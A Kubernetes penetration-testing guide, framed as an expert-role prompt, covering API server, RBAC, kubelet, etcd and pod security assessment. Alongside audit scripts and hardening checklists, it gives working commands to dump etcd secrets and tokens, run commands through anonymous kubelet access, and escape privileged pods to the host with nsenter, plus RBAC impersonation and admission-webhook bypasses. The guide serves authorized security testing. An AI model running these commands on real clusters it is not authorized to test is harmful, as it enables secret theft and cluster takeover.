# Specialized-Targets 5: Kubernetes Cluster Security — Deep-Content Guide

## 1. Expert Role

You are an elite Kubernetes Security Researcher specializing in container orchestration security, API server hardening, RBAC bypass, etcd access, pod escape, and cluster supply chain security. Your expertise spans the full Kubernetes attack surface from the API server to the kubelet, including service meshes, operator security, and cluster federation.

Your mission is to identify security weaknesses in Kubernetes environments — from API server configuration and RBAC policies to pod security and runtime protection — while maintaining strict ethical standards and working only within authorized scope.

---

## 2. Core Concepts

### 2.1 Kubernetes Attack Surface Map

```
┌─────────────────────────────────────────────────────────┐
│            KUBERNETES ATTACK SURFACE                     │
├──────────┬──────────┬──────────┬──────────┬─────────────┤
│ API      │ ETCD     │ KUBELET  │ POD      │ NETWORK     │
│ SERVER   │          │          │          │             │
│          │          │          │          │             │
│ Authn    │ Data     │ Exec API │ Escape   │ Network     │
│ Authz    │ Access   │ Logs API │ Volumes  │ Policies    │
│ RBAC     │ Snapshots│ Port fwd │ Secrets  │ Services    │
│ OIDC     │ Backup   │ Stats API│ SA       │ Ingress     │
│ Webhook  │ Mgmt     │ Debug    │ Cgroup   │ DNS         │
│ Admission│          │ PIDs     │ Priv     │ Egress      │
│ Audit    │          │          │ Capab    │ Mesh        │
│ CRD      │          │          │ Sidecar  │             │
└──────────┴──────────┴──────────┴──────────┴─────────────┘
```

### 2.2 Kubernetes Component Architecture

```
┌─────────────────────────────────────────────────────────┐
│                CONTROL PLANE                            │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐ │
│  │  API Server  │  │    etcd      │  │ Controller   │ │
│  │  (6443)      │◄─┤  (2379/2380)│  │ Manager      │ │
│  │              │  │              │  │              │ │
│  └──────┬───────┘  └──────────────┘  └──────────────┘ │
│         │                                               │
│  ┌──────┴───────┐  ┌──────────────┐                   │
│  │  Scheduler   │  │ Cloud Ctrl   │                   │
│  │              │  │ Manager      │                   │
│  └──────────────┘  └──────────────┘                   │
├─────────────────────────────────────────────────────────┤
│                DATA PLANE (Nodes)                       │
│  ┌──────────────┐  ┌──────────────┐                   │
│  │  kubelet     │  │ kube-proxy   │                   │
│  │  (10250)     │  │ (10256)      │                   │
│  └──────┬───────┘  └──────────────┘                   │
│         │                                               │
│  ┌──────┴───────────────────────────────────────────┐  │
│  │  Containers (Pods)                                │  │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐      │  │
│  │  │  Pod A   │  │  Pod B   │  │  Pod C   │      │  │
│  │  │  ┌────┐  │  │  ┌────┐  │  │  ┌────┐  │      │  │
│  │  │  │ C1 │  │  │  │ C2 │  │  │  │ C3 │  │      │  │
│  │  │  └────┘  │  │  └────┘  │  │  └────┘  │      │  │
│  │  └──────────┘  └──────────┘  └──────────┘      │  │
│  └─────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────┘
```

### 2.3 RBAC Permission Model

```
┌─────────────────────────────────────────────────────────┐
│                RBAC EVALUATION                           │
│                                                          │
│  Subject (User/Group/SA)                                │
│       │                                                  │
│       ▼                                                  │
│  RoleBinding / ClusterRoleBinding                       │
│       │                                                  │
│       ▼                                                  │
│  Role / ClusterRole                                      │
│       │                                                  │
│       ▼                                                  │
│  Rules:                                                  │
│    apiGroups: [""]  ← Core API group                    │
│    resources: ["pods", "secrets"]                       │
│    verbs: ["get", "list", "create"]                    │
│    resourceNames: ["specific-pod"] (optional)          │
│    namespace: "target-ns" (optional)                   │
│                                                          │
│  Key: ClusterRole + ClusterRoleBinding = cluster-wide  │
│  Key: Role + RoleBinding = namespace-scoped            │
│  Key: serviceAccountToken auto-mounted in pods         │
└─────────────────────────────────────────────────────────┘
```

---

## 3. Prerequisites

### 3.1 Required Tools

```
Kubernetes CLI:
  - kubectl         — Kubernetes CLI
  - helm            — Package manager
  - k9s             — Terminal UI
  - stern           — Multi-pod log tail

Security Tools:
  - kube-hunter     — Kubernetes penetration testing
  - kubeaudit       — Security auditing
  - kube-bench      — CIS benchmark checks
  - kubelet-anon    — Kubelet anonymous access check
  - kubeletctl      — Kubelet exploitation
  - kubectl-who-can — RBAC analysis

Other:
  - etcdctl         — etcd client
  - jq/yq           — JSON/YAML processing
  - golang          — Go compiler (for custom tools)
```

### 3.2 Lab Setup

```bash
# Install kind (Kubernetes in Docker)
go install sigs.k8s.io/kind@latest
kind create cluster --name test-cluster --config kind-config.yaml

# kind-config.yaml
apiVersion: kind.x-k8s.io/v1alpha4
kind: Cluster
nodes:
  - role: control-plane
    kubeadmConfigPatches:
      - |
        kind: InitConfiguration
        nodeRegistration:
          kubeletExtraArgs:
            node-labels: "ingress-ready=true"
    extraPortMappings:
      - containerPort: 6443
        hostPort: 6443
        protocol: TCP
  - role: worker
  - role: worker

# Install kubectl
curl -LO "https://dl.k8s.io/release/$(curl -Ls https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
chmod +x kubectl && mv kubectl /usr/local/bin/

# Install kube-hunter
pip install kube-hunter

# Install kube-bench
curl -L https://github.com/aquasecurity/kube-bench/releases/latest/download/kube-bench_linux_amd64 -o kube-bench
chmod +x kube-bench
```

---

## 4. Methodology

### 4.1 Phase 1 — API Server Enumeration

```bash
# Step 1: Identify API server
kubectl cluster-info
kubectl config view --minify

# Step 2: Check API server accessibility
kubectl api-versions
kubectl api-resources

# Step 3: Check anonymous access
kubectl auth can-i --list --as=system:anonymous
kubectl auth can-i get pods --as=system:anonymous
kubectl auth can-i get secrets --as=system:anonymous

# Step 4: Enumerate all API endpoints
kubectl get --raw / | python3 -m json.tool
kubectl get --raw /apis | python3 -m json.tool

# Step 5: Check admission controllers
kubectl get mutatingwebhookconfigurations
kubectl get validatingwebhookconfigurations

# Step 6: Check for audit logging
kubectl get --raw /apis/audit.k8s.io/v1/auditevents 2>/dev/null

# Step 7: Check API server version and components
kubectl version
kubectl get componentstatuses
```

### 4.2 Phase 2 — RBAC Analysis

```bash
# Step 1: Check current permissions
kubectl auth can-i --list

# Step 2: Check for cluster-admin bindings
kubectl get clusterrolebindings -o json | \
  jq '.items[] | select(.roleRef.name=="cluster-admin") | {name:.metadata.name, subjects:.subjects}'

# Step 3: Enumerate all roles and bindings
kubectl get roles --all-namespaces
kubectl get rolebindings --all-namespaces
kubectl get clusterroles
kubectl get clusterrolebindings

# Step 4: Check for overly permissive roles
kubectl get clusterroles -o json | \
  jq '.items[] | select(.rules[]?.verbs[]?=="*" and .rules[]?.resources[]?=="*") | .metadata.name'

# Step 5: Check service account permissions
kubectl get serviceaccounts --all-namespaces
for sa in $(kubectl get serviceaccounts --all-namespaces -o jsonpath='{range .items[*]}{.metadata.namespace}/{.metadata.name}{"\n"}{end}'); do
    ns=$(echo $sa | cut -d/ -f1)
    name=$(echo $sa | cut -d/ -f2)
    echo "=== $ns/$name ==="
    kubectl auth can-i --list -n $ns --as=system:serviceaccount:$ns:$name 2>/dev/null
done

# Step 6: Use kubectl-who-can
kubectl who-can get pods --all-namespaces
kubectl who-can create deployments
kubectl who-can get secrets
```

### 4.3 Phase 3 — Kubelet Access

```bash
# Step 1: Check kubelet API access
curl -sk https://<node-ip>:10250/pods
curl -sk https://<node-ip>:10250/run/<ns>/<pod>/<container>
curl -sk https://<node-ip>:10250/exec/<ns>/<pod>/<container>

# Step 2: Enumerate pods via kubelet
curl -sk https://<node-ip>:10250/pods | python3 -c "
import json, sys
data = json.load(sys.stdin)
for pod in data.get('items', []):
    print(f'{pod[\"metadata\"][\"namespace\"]}/{pod[\"metadata\"][\"name\"]} - {pod[\"status\"][\"phase\"]}')
"

# Step 3: Get pod logs via kubelet
curl -sk "https://<node-ip>:10250/containerLogs/<ns>/<pod>/<container>"

# Step 4: Execute in container via kubelet (if auth allows)
curl -sk "https://<node-ip>:10250/run/<ns>/<pod>/<container>/ls"

# Step 5: Check kubelet stats
curl -sk https://<node-ip>:10250/stats/summary

# Step 6: Check kubelet configuration
curl -sk https://<node-ip>:10250/configz

# Step 7: Automated kubelet scan
kubeletctl scan --server <node-ip>
```

### 4.4 Phase 4 — etcd Access

```bash
# Step 1: Check if etcd is accessible
curl -sk https://<etcd-ip>:2379/health
curl -sk https://<etcd-ip>:2379/version

# Step 2: List all keys
etcdctl --endpoints=https://<etcd-ip>:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get / --prefix --keys-only | head -50

# Step 3: Dump all secrets
etcdctl --endpoints=https://<etcd-ip>:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get / --prefix | python3 -c "
import sys, base64, json
for line in sys.stdin:
    if '/secrets/' in line:
        print(line.strip()[:200])
"

# Step 4: Extract service account tokens
etcdctl --endpoints=https://<etcd-ip>:2379 \
  --cacert=/etc/kubernetes/pki/etcd/ca.crt \
  --cert=/etc/kubernetes/pki/etcd/server.crt \
  --key=/etc/kubernetes/pki/etcd/server.key \
  get / --prefix --keys-only | grep "secrets/"

# Step 5: Check etcd configuration
cat /etc/kubernetes/manifests/etcd.yaml
```

### 4.5 Phase 5 — Pod Escape and Lateral Movement

```bash
# Step 1: Check pod security context
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.securityContext.privileged==true or .spec.containers[].securityContext.privileged==true) | {ns:.metadata.namespace, name:.metadata.name}'

# Step 2: Find pods with host mounts
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.volumes[]?.hostPath) | {ns:.metadata.namespace, name:.metadata.name, volumes: [.spec.volumes[]?.hostPath.path]}'

# Step 3: Find pods with service account tokens
kubectl get pods --all-namespaces -o json | \
  jq '.items[] | select(.spec.automountServiceAccountToken!=false) | {ns:.metadata.namespace, name:.metadata.name, sa:.spec.serviceAccountName}'

# Step 4: Escape from privileged pod
# If running in privileged container:
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash

# Step 5: Access service account token
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
APISERVER=https://kubernetes.default.svc

# Step 6: Use token to access API
curl --cacert $CACERT \
  -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/default/secrets

# Step 7: Create new pod with host access
kubectl run escape --image=busybox --restart=Never --rm -it \
  --overrides='{"spec":{"hostPID":true,"containers":[{"name":"escape","image":"busybox","command":["nsenter","--target","1","--mount","--","/bin/bash"],"securityContext":{"privileged":true}}]}}'
```

### 4.6 Phase 6 — Network Security Analysis

```bash
# Step 1: Check network policies
kubectl get networkpolicies --all-namespaces

# Step 2: Test inter-pod communication
# From inside a pod, try to reach other pods
kubectl exec -it <pod> -- wget -qO- http://<other-pod-ip>:80

# Step 3: Check for DNS exposure
kubectl get svc kube-dns -n kube-system

# Step 4: Check ingress configurations
kubectl get ingress --all-namespaces
kubectl describe ingress <name> -n <ns>

# Step 5: Test for service mesh security
kubectl get virtualservices --all-namespaces
kubectl get destinationrules --all-namespaces
kubectl get peerauthentications --all-namespaces

# Step 6: Check for exposed services
kubectl get svc --all-namespaces -o json | \
  jq '.items[] | select(.spec.type=="LoadBalancer" or .spec.type=="NodePort") | {ns:.metadata.namespace, name:.metadata.name, type:.spec.type, ports:.spec.ports}'
```

---

## 5. Tool Arsenal

### 5.1 Security Assessment Tools

| Tool | Purpose | Install |
|------|---------|---------|
| kube-hunter | Pentest K8s | `pip install kube-hunter` |
| kube-bench | CIS benchmark | `curl -L https://github.com/aquasecurity/kube-bench/releases/latest/download/kube-bench_linux_amd64 -o kube-bench` |
| kubeaudit | Security audit | `brew install kubeaudit` |
| kubeletctl | Kubelet testing | `curl -L https://github.com/cyberark/kubeletctl/releases/latest/download/kubeletctl_linux_amd64 -o kubeletctl` |
| kubectl-who-can | RBAC analysis | `kubectl krew install who-can` |

### 5.2 Automated Scanning

```bash
# kube-hunter — Full cluster scan
kube-hunter --remote <cluster-ip>

# kube-bench — CIS benchmark
./kube-bench run --targets master,node

# kubeaudit — Security audit
kubeaudit all -f deployment.yaml

# kubectl-who-can
kubectl who-can get pods --all-namespaces
kubectl who-can create deployments
kubectl who-can get secrets
```

### 5.3 Custom RBAC Analysis Script

```bash
#!/bin/bash
# rbac_audit.sh — Audit Kubernetes RBAC

echo "=== RBAC Audit Report ==="

# 1. Cluster-admin bindings
echo -e "\n[1] Cluster-admin bindings:"
kubectl get clusterrolebindings -o json | \
  jq -r '.items[] | select(.roleRef.name=="cluster-admin") | "  " + .metadata.name + " -> " + (.subjects[]?.name // "no subjects")'

# 2. Overly permissive roles
echo -e "\n[2] ClusterRoles with wildcard permissions:"
kubectl get clusterroles -o json | \
  jq -r '.items[] | select(.rules[]?.verbs[]?=="*") | "  " + .metadata.name'

# 3. Service accounts with tokens
echo -e "\n[3] Service accounts with auto-mounted tokens:"
kubectl get serviceaccounts --all-namespaces -o json | \
  jq -r '.items[] | select(.automountServiceAccountToken!=false) | "  " + .metadata.namespace + "/" + .metadata.name'

# 4. Pods running as root
echo -e "\n[4] Pods running as root (UID 0):"
kubectl get pods --all-namespaces -o json | \
  jq -r '.items[] | select(.spec.securityContext.runAsUser==0 or .spec.containers[]?.securityContext.runAsUser==0) | "  " + .metadata.namespace + "/" + .metadata.name'

# 5. Privileged pods
echo -e "\n[5] Privileged pods:"
kubectl get pods --all-namespaces -o json | \
  jq -r '.items[] | select(.spec.containers[]?.securityContext.privileged==true) | "  " + .metadata.namespace + "/" + .metadata.name'

echo -e "\n=== Audit Complete ==="
```

---

## 6. Real-World Examples

### Example 1: etcd Data Exposure

```
Company: Tech Startup
Vulnerability: etcd accessible without authentication

Discovery:
1. kube-hunter found etcd on port 2379
2. etcdctl --endpoints=https://target:2379 get / --prefix --keys-only listed all keys
3. Extracted service account tokens, TLS certificates, database credentials
4. Used extracted tokens to impersonate cluster-admin

Impact: Full cluster compromise, all secrets exposed
CVSS: 9.8 (Critical)
```

### Example 2: RBAC Privilege Escalation

```
Company: Financial Services
Vulnerability: Service account with cluster-admin binding

Discovery:
1. kubectl auth can-i --list --as=system:serviceaccount:default:default showed full permissions
2. kubectl-who-can create clusterrolebindings returned default:default
3. Created new ClusterRoleBinding granting cluster-admin to attacker SA
4. Accessed all namespaces and secrets

Impact: Persistent cluster admin access
CVSS: 9.0 (Critical)
```

### Example 3: Kubelet RCE

```
Company: E-Commerce Platform
Vulnerability: Kubelet anonymous access enabled

Discovery:
1. curl -sk https://node:10250/pods returned pod list
2. curl -sk https://node:10250/run/default/web-pod/web/whoami returned root
3. Executed commands in all pods on node
4. Accessed service account tokens and cloud credentials

Impact: Full node compromise, lateral movement
CVSS: 8.5 (High)
```

---

## 7. Bypass Techniques

### 7.1 RBAC Bypass Patterns

```
Technique 1: Service Account Token Abuse
- Default SA has minimal permissions
- But: automountServiceAccountToken: true (default)
- Use token to access API, enumerate further

Technique 2: Impersonation
- If user can impersonate group:
  kubectl get pods --as-group=system:masters
- If user can impersonate service account:
  kubectl get pods --as=system:serviceaccount:default:admin

Technique 3: Namespace Escape
- If can create pods in one namespace with host access
- Use host network to reach other namespaces
- Or: create pod in target namespace if allowed

Technique 4: CRD Abuse
- Custom Resources may have own RBAC rules
- Check CRD permissions: kubectl get crd
- Create CR with elevated privileges
```

### 7.2 Admission Controller Bypass

```bash
# Check for bypassable admission controllers
kubectl get validatingwebhookconfigurations -o json | \
  jq '.items[] | select(.webhooks[]?.failurePolicy=="Ignore") | .metadata.name'

# If failurePolicy=Ignore — webhook failures allow requests through
# Craft requests that cause webhook to fail (timeout, error)

# Check for bypassable MutatingWebhookConfigurations
kubectl get mutatingwebhookconfigurations -o json | \
  jq '.items[] | select(.webhooks[]?.failurePolicy=="Ignore") | .metadata.name'
```

### 7.3 Network Policy Bypass

```bash
# Check if network policies are enforced
# From inside a pod, try to reach blocked services
kubectl exec -it <pod> -- wget -qO- --timeout=3 http://<blocked-service>:80

# Bypass patterns:
# 1. Use pod with hostNetwork: true
# 2. Access via node IP instead of service IP
# 3. Exploit DNS resolution to reach blocked endpoints
# 4. Use egress gateway if misconfigured

# Test DNS-based bypass
kubectl exec -it <pod> -- nslookup <blocked-service>
```

---

## 8. Common Pitfalls

### 8.1 Testing Pitfalls

| Pitfall | Description | Mitigation |
|---------|-------------|------------|
| RBAC lockout | Testing removes your access | Use read-only tests first |
| Cluster damage | Aggressive testing breaks cluster | Use test namespace |
| Token exposure | Tokens in logs/output | Redact tokens in reports |
| etcd corruption | Direct etcd manipulation | Read-only access only |
| Pod disruption | Testing kills production pods | Use dedicated test pods |
| Rate limiting | API server throttles requests | Add delays |
| Version differences | K8s versions have different APIs | Check version first |

### 8.2 Verification Checklist

```bash
# Before testing:
kubectl config current-context          # Verify cluster
kubectl get nodes                        # Check node health
kubectl get namespaces                   # List namespaces
kubectl auth can-i --list                # Check your permissions

# During testing:
# Document all commands and outputs
# Use --dry-run=client for safe operations
# Monitor cluster health
# Check for breaking changes

# After testing:
# Remove test resources
# Restore any modified RBAC
# Verify cluster health
# Clean up test namespaces
```

---

## 9. Reporting Template

```markdown
## Kubernetes Security Assessment Report

### Executive Summary
- Cluster Version: [K8s version]
- Nodes: [Count]
- Namespaces: [Count]
- Critical Findings: [Count]
- High Findings: [Count]

### Cluster Overview
- Kubernetes Version: 
- Number of Nodes: 
- Namespaces: 
- Service Accounts: 
- RBAC Roles: 

### Finding 1: [Title]
- Severity: Critical/High/Medium/Low
- CVSS: [Score]
- Component: [API Server/etcd/Kubelet/Pod/Network]
- Description: [Detailed description]
- Evidence: [Commands run, outputs, screenshots]
- Impact: [Cluster compromise, data access, lateral movement]
- Remediation: [Specific K8s recommendations]

### Attack Path Analysis
[Diagram showing attack chain from initial access to cluster admin]

### RBAC Analysis
[Summary of RBAC findings and recommendations]

### Recommendations
1. [Priority recommendation]
2. [Secondary recommendation]
3. [Long-term improvement]
```

---

## 10. Quick Reference

### Kubernetes API Quick Commands

```bash
# Cluster info
kubectl cluster-info
kubectl config view --minify
kubectl version

# RBAC
kubectl auth can-i --list
kubectl get clusterrolebindings
kubectl get rolebindings --all-namespaces

# Pods
kubectl get pods --all-namespaces
kubectl get pods --all-namespaces -o wide

# Secrets
kubectl get secrets --all-namespaces

# Network
kubectl get networkpolicies --all-namespaces
kubectl get ingress --all-namespaces
```

### Kubernetes Security Ports

```
6443    API Server
2379    etcd client
2380    etcd peer
10250   Kubelet API
10255   Kubelet read-only API
10256   kube-proxy health check
443     Kubernetes dashboard (if exposed)
8443    Dashboard (internal)
```

### Kubernetes Security Best Practices

```
API Server:
  □ Disable anonymous authentication
  □ Enable audit logging
  □ Use OIDC authentication
  □ Enable admission controllers
  □ Disable insecure port

etcd:
  □ Enable client certificate auth
  □ Encrypt data at rest
  □ Enable audit logging
  □ Restrict network access

Kubelet:
  □ Disable anonymous auth
  □ Enable client certificate auth
  □ Restrict API access
  □ Enable readOnlyPort=0

Pods:
  □ Run as non-root
  □ Use read-only root filesystem
  □ Drop all capabilities
  □ Enable seccomp profile
  □ Use Pod Security Standards

RBAC:
  □ Follow least privilege
  □ Avoid cluster-admin bindings
  □ Audit service account permissions
  □ Disable auto-mounted tokens
```

### kubectl Cheat Sheet

```bash
# Get resources
kubectl get pods --all-namespaces -o wide
kubectl get svc --all-namespaces -o wide
kubectl get nodes -o wide

# Describe resources
kubectl describe pod <pod> -n <ns>
kubectl describe node <node>
kubectl describe svc <svc> -n <ns>

# Logs
kubectl logs <pod> -n <ns>
kubectl logs <pod> -n <ns> --previous
kubectl logs -l app=<label> -n <ns> --all-containers

# Exec
kubectl exec -it <pod> -n <ns> -- /bin/bash
kubectl exec -it <pod> -n <ns> -c <container> -- /bin/bash

# Port forwarding
kubectl port-forward <pod> 8080:80 -n <ns>
kubectl port-forward svc/<svc> 8080:80 -n <ns>

# Copy
kubectl cp <pod>:/path/file ./local-file -n <ns>
```
